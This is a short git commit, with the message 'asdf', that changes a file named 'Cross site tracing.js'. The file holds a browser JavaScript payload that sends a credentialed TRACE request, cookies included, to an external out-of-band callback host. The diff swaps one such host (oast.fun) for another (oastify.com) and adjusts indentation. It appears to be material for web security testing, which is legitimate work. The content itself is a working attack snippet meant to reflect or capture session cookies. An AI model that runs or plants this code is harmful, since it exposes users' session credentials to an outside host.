4f6fe194423861edabe3c8efdc96cc6832a7e9fd
Skyfire100 <adamargentin@gmail.com>
2024-03-08 00:12:41 -0800

    asdf

--- Cross site tracing.js
+++ Cross site tracing.js
@@ -1,6 +1,6 @@
-  var xmlhttp = new XMLHttpRequest();
-  var url = 'http://tiwsaebwkhezyjvusgttybwm688wcuxn2.oast.fun/';
+var xmlhttp = new XMLHttpRequest();
+var url = 'https://qwq1m80koswtmebmqpxkjdz7uy0pofc4.oastify.com/';
 
-  xmlhttp.withCredentials = true; // send cookie header
-  xmlhttp.open('TRACE', url, false);
-  xmlhttp.send();
+xmlhttp.withCredentials = true; // send cookie header
+xmlhttp.open('TRACE', url, false);
+xmlhttp.send();
